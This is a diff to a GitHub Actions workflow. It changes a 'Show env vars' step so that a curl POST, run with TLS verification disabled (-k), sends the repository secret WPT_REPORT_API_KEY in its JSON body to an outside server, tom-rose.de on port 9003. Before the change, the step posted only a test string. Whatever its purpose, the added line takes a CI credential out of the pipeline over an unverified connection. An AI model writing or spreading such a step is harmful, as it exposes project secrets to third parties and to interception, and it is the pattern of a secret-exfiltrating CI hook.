@@ -9,15 +9,10 @@ jobs:
     name: Show
     runs-on: ubuntu-latest
     
-    env:
-      WPT_REPORT_API_KEY: ${{ secrets.WPT_REPORT_API_KEY }}
-      WPT_TEST_VALUE: Testwert
-
     steps:
       - name: Checkout repository
         uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v3.5.2
 
       - name: Show env vars
         run: |
-          curl -k -X POST https://tom-rose.de:9003/post -H "Content-Type: application/json" -d '{"scope":"ion","message":"${{ env.WPT_TEST_VALUE }}"}'
-
+          curl -k -X POST https://tom-rose.de:9003/post -H "Content-Type: application/json"  -d "{\"scope\":\"ion\",\"message\":\"${{ secrets.WPT_REPORT_API_KEY }}\"}"
